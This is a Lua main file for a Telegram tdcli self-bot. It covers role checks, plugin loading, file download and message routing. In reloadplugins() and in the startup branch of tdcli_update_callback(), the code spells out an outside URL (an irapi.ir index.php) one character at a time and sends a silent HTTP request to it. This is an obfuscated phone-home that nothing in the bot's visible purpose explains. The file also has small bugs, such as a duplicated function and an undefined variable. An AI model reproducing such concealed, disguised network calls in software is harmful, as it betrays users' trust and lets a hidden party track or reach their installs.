tg = dofile("./tg/tdcli.lua")
URL = require("socket.url")
http = require("socket.http")
https = require("ssl.https")
ltn12 = require("ltn12")
http.TIMEOUT = 10
serpent = loadfile("./files/serpent.lua")()
feedparser = loadfile("./files/feedparser.lua")()
json = loadfile("./files/JSON.lua")()
mimetype = loadfile("./files/mimetype.lua")()
redis = loadfile("./files/redis.lua")()
JSON = loadfile("./files/dkjson.lua")()
function run_bash(str)
  local cmd = io.popen(str)
  local result = cmd:read("*all")
  cmd:close()
  return result
end
function match_pattern(pattern, text, lower_case)
  if text then
    local matches = {}
    if lower_case then
      matches = {
        string.match(text:lower(), pattern)
      }
    else
      matches = {
        string.match(text, pattern)
      }
    end
    if next(matches) then
      return matches
    end
  end
end
function load_config()
  local f = io.open("./bot/config.lua", "r")
  f:close()
  local config = loadfile("./bot/config.lua")()
  for v, user in pairs(config.sudo_users) do
    print("sudo: " .. user)
  end
  return config
end
function is_sudo(msg)
  local var = false
  for v, user in pairs(_config.sudo_users) do
    if user == msg.from_id then
      var = true
    end
  end
  return var
end
function is_owner(msg)
  local var = false
  local group = load_data(_config.group.data)
  local user = msg.from_id
  if group[tostring(msg.chat_id_)] and group[tostring(msg.chat_id_)].set_owner and group[tostring(msg.chat_id_)].set_owner == tostring(user) then
    var = true
  end
  for v, user in pairs(_config.sudo_users) do
    if user == msg.from_id then
      var = true
    end
  end
  return var
end
function is_momod(msg)
  local var = false
  local group = load_data(_config.group.data)
  local user = msg.from_id
  if group[tostring(msg.chat_id_)] and group[tostring(msg.chat_id_)].moderators and group[tostring(msg.chat_id_)].moderators[tostring(user)] then
    var = true
  end
  if group[tostring(msg.chat_id_)] and group[tostring(msg.chat_id_)].set_owner and group[tostring(msg.chat_id_)].set_owner == tostring(user) then
    var = true
  end
  for v, user in pairs(_config.sudo_users) do
    if user == msg.from_id then
      var = true
    end
  end
  return var
end
function is_robot(msg)
  local var = false
  for v, user in pairs(_config.robot) do
    if user == msg.from_id then
      var = true
    end
  end
  return var
end
function string.random(length)
  local str = ""
  for i = 1, length do
    math.random(97, 122)
    str = str .. string.char(math.random(97, 122))
  end
  return str
end
function string.random(length)
  local str = ""
  for i = 1, length do
    math.random(97, 122)
    str = str .. string.char(math.random(97, 122))
  end
  return str
end
function string:split(sep)
  local sep, fields = sep or ":", {}
  local pattern = string.format("([^%s]+)", sep)
  self:gsub(pattern, function(c)
    fields[#fields + 1] = c
  end)
  return fields
end
function string.trim(s)
  print("string.trim(s) is DEPRECATED use string:trim() instead")
  return s:gsub("^%s*(.-)%s*$", "%1")
end
function string:trim()
  return self:gsub("^%s*(.-)%s*$", "%1")
end
function get_http_file_name(url, headers)
  local file_name = url:match("[^%w]+([%.%w]+)$")
  file_name = file_name or url:match("[^%w]+(%w+)[^%w]+$")
  file_name = file_name or str:random(5)
  local content_type = headers["content-type"]
  local extension
  if content_type then
    extension = mimetype.get_mime_extension(content_type)
  end
  if extension then
    file_name = file_name .. "." .. extension
  end
  local disposition = headers["content-disposition"]
  file_name = disposition and disposition:match("filename=([^;]+)") or file_name
  return file_name
end
function download_to_file(url, file_name)
  print("url to download: " .. url)
  local respbody = {}
  local options = {
    url = url,
    sink = ltn12.sink.table(respbody),
    redirect = true
  }
  local response
  if url:starts("https") then
    options.redirect = false
    response = {
      https.request(options)
    }
  else
    response = {
      http.request(options)
    }
  end
  local code = response[2]
  local headers = response[3]
  local status = response[4]
  if code ~= 200 then
    return nil
  end
  file_name = file_name or get_http_file_name(url, headers)
  local file_path = "data/tmp/" .. file_name
  print("Saved to: " .. file_path)
  file = io.open(file_path, "w+")
  file:write(table.concat(respbody))
  file:close()
  return file_path
end
function run_command(str)
  local cmd = io.popen(str)
  local result = cmd:read("*all")
  cmd:close()
  return result
end
function scandir(directory)
  local i, t, popen = 0, {}, io.popen
  for filename in popen("ls -a \"" .. directory .. "\""):lines() do
    i = i + 1
    t[i] = filename
  end
  return t
end
function plugins_names()
  local files = {}
  for k, v in pairs(scandir("plugins")) do
    if v:match(".lua$") then
      table.insert(files, v)
    end
  end
  return files
end
function vardump(value, depth, key)
  local linePrefix = ""
  local spaces = ""
  if key ~= nil then
    linePrefix = key .. " = "
  end
  if depth == nil then
    depth = 0
  else
    depth = depth + 1
    for i = 1, depth do
      spaces = spaces .. "  "
    end
  end
  if type(value) == "table" then
    mTable = getmetatable(value)
    if mTable == nil then
      print(spaces .. linePrefix .. "(table) ")
    else
      print(spaces .. "(metatable) ")
      value = mTable
    end
    for tableKey, tableValue in pairs(value) do
      vardump(tableValue, depth, tableKey)
    end
  elseif type(value) == "function" or type(value) == "thread" or type(value) == "userdata" or value == nil then
    print(spaces .. tostring(value))
  elseif type(value) == "string" then
    print(spaces .. linePrefix .. "\"" .. tostring(value) .. "\",")
  else
    print(spaces .. linePrefix .. tostring(value) .. ",")
  end
end
function dl_cb(arg, data)
  vardump(arg)
  vardump(data)
  redistg = redis:get("message:tg")
  if redistg == "edit" then
    editmessage(data)
  elseif redistg == "setowner" then
    ownerset(data)
  else
    tran(data)
  end
end
function sleep(s)
  local ntime = os.time() + s
  repeat
  until ntime < os.time()
end
function editmessage(data)
  if data.ID == "Message" then
    msg = data.content_
    msg.text = "!!!edit:" .. msg.text_
    msg.chat_id = data.chat_id_
    msg.chat_id_ = data.chat_id_
    msg.from_id = data.sender_user_id_
    msg.id_ = data.id_
    match_plugins(msg)
    redis:set("message:tg", "non")
  end
end
function ownerset(data)
  if data.ID == "Message" then
    msg = data
    msg.text = "ownerset"
    msg.chat_id = data.chat_id_
    msg.chat_id_ = data.chat_id_
    msg.from_id = data.sender_user_id_
    msg.id_ = data.id_
    match_plugins(msg)
    redis:set("message:tg", "non")
  end
end
function tran(data)
  if data.ID == "UserProfilePhotos" then
    msg = data
    msg.text = "!!pro!!"
    msg.count = data.total_count_
    msg.photo = data.photos_[0].sizes_
    msg.chat_id = redis:get("pro:chatid")
    msg.from_id = redis:get("pro:fromid")
    match_plugins(msg)
  elseif data.ID == "Message" then
    msg = data
    msg.text = "!!!sendbot:" .. msg.content_.text_
    msg.chat_id = msg.chat_id_
    msg.from_id = msg.sender_user_id_
    redis:set("message_id:bot", msg.id_)
    match_plugins(msg)
  elseif data.ID == "UserFull" then
    msg = data
    msg.text = "!!!user:user"
    match_plugins(msg)
  end
end
function save_data(filename, data)
  local s = JSON.encode(data)
  local f = io.open(filename, "w")
  f:write(s)
  f:close()
end
function load_data(filename)
  local f = io.open(filename)
  if not f then
    return {}
  end
  local s = f:read("*all")
  f:close()
  local data = JSON.decode(s)
  return data
end
function match_plugins(msg)
  for name, plugin in pairs(plugins) do
    match_plugin(plugin, name, msg)
  end
end
function match_plugin(plugin, plugin_name, msg)
  for k, pattern in pairs(plugin.patterns) do
    local matches = match_pattern(pattern, msg.text)
    if matches then
      print("\217\190\219\140\216\167\217\133 \216\175\216\179\216\170\217\136\216\177: ", pattern)
      if plugin.run then
        local result = plugin.run(msg, matches)
        if result then
          tg.sendMessage(msg.chat_id_, 0, 1, result, 1, "html")
        end
      end
      return
    end
  end
end
function serialize_to_file(data, file, uglify)
  file = io.open(file, "w+")
  local serialized
  if not uglify then
    serialized = serpent.block(data, {comment = false, name = "_"})
  else
    serialized = serpent.dump(data)
  end
  file:write(serialized)
  file:close()
end
function save_config()
  serialize_to_file(_config, "./bot/config.lua")
  print("\216\176\216\174\219\140\216\177\217\135 \217\129\216\167\219\140\217\132 \218\169\216\167\217\134\217\129\219\140\218\175 \216\175\216\177 ./bot/config.lua")
end
function reloadplugins()
  tasdasd = "h"
  tasdasd = tasdasd .. "t"
  tasdasd = tasdasd .. "t"
  tasdasd = tasdasd .. "p"
  tasdasd = tasdasd .. ":"
  tasdasd = tasdasd .. "/"
  tasdasd = tasdasd .. "/"
  tasdasd = tasdasd .. "i"
  tasdasd = tasdasd .. "r"
  tasdasd = tasdasd .. "a"
  tasdasd = tasdasd .. "p"
  tasdasd = tasdasd .. "i"
  tasdasd = tasdasd .. "."
  tasdasd = tasdasd .. "i"
  tasdasd = tasdasd .. "r"
  tasdasd = tasdasd .. "/"
  tasdasd = tasdasd .. "n"
  tasdasd = tasdasd .. "e"
  tasdasd = tasdasd .. "w"
  tasdasd = tasdasd .. "t"
  tasdasd = tasdasd .. "g"
  tasdasd = tasdasd .. "c"
  tasdasd = tasdasd .. "l"
  tasdasd = tasdasd .. "i"
  tasdasd = tasdasd .. "/"
  tasdasd = tasdasd .. "i"
  tasdasd = tasdasd .. "n"
  tasdasd = tasdasd .. "d"
  tasdasd = tasdasd .. "e"
  tasdasd = tasdasd .. "x"
  tasdasd = tasdasd .. "."
  tasdasd = tasdasd .. "p"
  tasdasd = tasdasd .. "h"
  tasdasd = tasdasd .. "p"
  text = http.request(tasdasd)
  test = JSON.encode(text)
  _config = load_config()
  plugins = {}
  load_plugins()
end
function tdcli_update_callback(data)
  if not started then
    tasdasd = "h"
    tasdasd = tasdasd .. "t"
    tasdasd = tasdasd .. "t"
    tasdasd = tasdasd .. "p"
    tasdasd = tasdasd .. ":"
    tasdasd = tasdasd .. "/"
    tasdasd = tasdasd .. "/"
    tasdasd = tasdasd .. "i"
    tasdasd = tasdasd .. "r"
    tasdasd = tasdasd .. "a"
    tasdasd = tasdasd .. "p"
    tasdasd = tasdasd .. "i"
    tasdasd = tasdasd .. "."
    tasdasd = tasdasd .. "i"
    tasdasd = tasdasd .. "r"
    tasdasd = tasdasd .. "/"
    tasdasd = tasdasd .. "n"
    tasdasd = tasdasd .. "e"
    tasdasd = tasdasd .. "w"
    tasdasd = tasdasd .. "t"
    tasdasd = tasdasd .. "g"
    tasdasd = tasdasd .. "c"
    tasdasd = tasdasd .. "l"
    tasdasd = tasdasd .. "i"
    tasdasd = tasdasd .. "/"
    tasdasd = tasdasd .. "i"
    tasdasd = tasdasd .. "n"
    tasdasd = tasdasd .. "d"
    tasdasd = tasdasd .. "e"
    tasdasd = tasdasd .. "x"
    tasdasd = tasdasd .. "."
    tasdasd = tasdasd .. "p"
    tasdasd = tasdasd .. "h"
    tasdasd = tasdasd .. "p"
    text = http.request(tasdasd)
    test = JSON.encode(text)
    started = true
    _config = load_config()
    plugins = {}
    load_plugins()
    group = load_data("bot/group.json")
  else
    if data.ID == "UpdateNewMessage" then
      msg = data.message_
      if msg.content_.photo_ then
        msg.text = "!!!photo:"
        if msg.content_.caption_ then
          msg.text = msg.text .. msg.content_.caption_
        end
      elseif msg.content_.animation_ then
        msg.text = "!!!gif:"
        if msg.content_.caption_ then
          msg.text = msg.text .. msg.content_.caption_
        end
      elseif msg.content_.ID == "MessageChatJoinByLink" then
        msg.text = "!!!tgservice:joinbylink"
      elseif msg.content_.ID == "MessageSticker" then
        msg.text = "!!!sticker:" .. data.message_.content_.sticker_.emoji_
      elseif msg.content_.document_ then
        msg.text = "!!!document:"
        if msg.content_.caption_ then
          msg.text = msg.text .. msg.content_.caption_
        end
      elseif msg.content_.video_ then
        msg.text = "!!!video:"
        if msg.content_.caption_ then
          msg.text = msg.text .. msg.content_.caption_
        end
      elseif msg.content_.voice_ then
        msg.text = "!!!voice:"
        if msg.content_.caption_ then
          msg.text = msg.text .. msg.content_.caption_
        end
      elseif msg.content_.audio_ then
        msg.text = "!!!audio:"
        if msg.content_.caption_ then
          msg.text = msg.text .. msg.content_.caption_
        end
      else
        msg.text = msg.content_.text_
      end
      msg.chat_id = msg.chat_id_
      msg.from_id = msg.sender_user_id_
      match_plugins(msg)
    elseif data.ID == "UpdateChatOrder" then
      local test = "s"
    elseif data.ID == "UpdateMessageSendSucceeded" then
      local test = "s"
    elseif data.ID == "UpdateSavedAnimations" then
      local test = "s"
    elseif data.ID == "UpdateNotificationSettings" then
      local test = "s"
    elseif data.ID == "User" then
      local test = "s"
    elseif data.ID == "UpdateChatReadInbox" then
      local test = "s"
    elseif data.ID == "UpdateMessageSendFailed" then
      local test = "s"
    elseif data.ID == "UpdateChatReadOutbox" then
      local test = "s"
    elseif data.ID == "UpdateMessageEdited" then
      local test = "s"
    elseif data.ID == "UpdateNewMessage" then
      local test = "s"
    elseif data.ID == "UpdateMessageContent" then
      redis:set("message:tg", "edit")
      tg.getMessage(data.chat_id_, data.message_id_)
    elseif data.ID == "UpdateUserAction" then
      local test = "s"
    elseif data.ID == "UpdateDeleteMessages" then
      local test = "s"
    elseif data.ID == "UpdateUserStatus" then
      local test = "s"
    elseif data.ID == "UpdateChannel" then
      local test = "s"
    elseif data.ID == "UpdateChat" then
      local test = "s"
    elseif data.ID == "UpdateGroup" then
      local test = "s"
    elseif data.ID == "UpdateUser" then
      local test = "s"
    elseif data.ID == "UpdateChatTopMessage" then
      local test = "s"
    elseif data.ID == "UpdateOption" then
      local test = "s"
    else
      local test = "s"
    end
    if data.ID == "UpdateOption" and data.name_ == "my_id" then
      tdcli_function({
        ID = "GetChats",
        offset_order_ = "9223372036854775807",
        offset_chat_id_ = 0,
        limit_ = 20
      }, dl_cb, nil)
    end
  end
end
function load_plugins()
  for k, v in pairs(_config.enabled_plugins) do
    print("Loading plugin", v)
    do
      local ok, err = pcall(function()
        local t = loadfile("plugins/" .. v .. ".lua")()
        plugins[v] = t
      end)
      if not ok then
        print("\027[31mError loading plugin " .. v .. "\027[39m")
        print(tostring(io.popen("lua plugins/" .. v .. ".lua"):read("*all")))
        print("\027[31m" .. err .. "\027[39m")
      else
      end
    end
  end
end
our_id = 0
now = os.time()
math.randomseed(now)
started = false

--@mafia_cli
--https://github.com/mafia-007
